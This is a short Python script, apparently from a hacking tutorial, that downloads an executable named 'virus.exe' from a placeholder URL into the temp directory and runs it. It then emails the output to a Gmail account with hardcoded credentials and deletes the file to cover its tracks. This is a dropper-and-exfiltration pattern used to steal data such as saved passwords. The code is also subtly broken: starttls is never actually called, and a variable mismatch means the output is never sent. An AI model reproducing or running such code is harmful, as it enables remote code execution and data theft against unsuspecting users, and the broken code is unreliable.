import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, passwd, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls
    server.login(email, passwd)
    server.sendmail(email, email, msg)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("https://www.example.com/virus.exe")
network = subprocess.check_output("virus.exe all", shell=True)
send_mail("email@gmail.com", "password", result)
os.remove("virus.exe")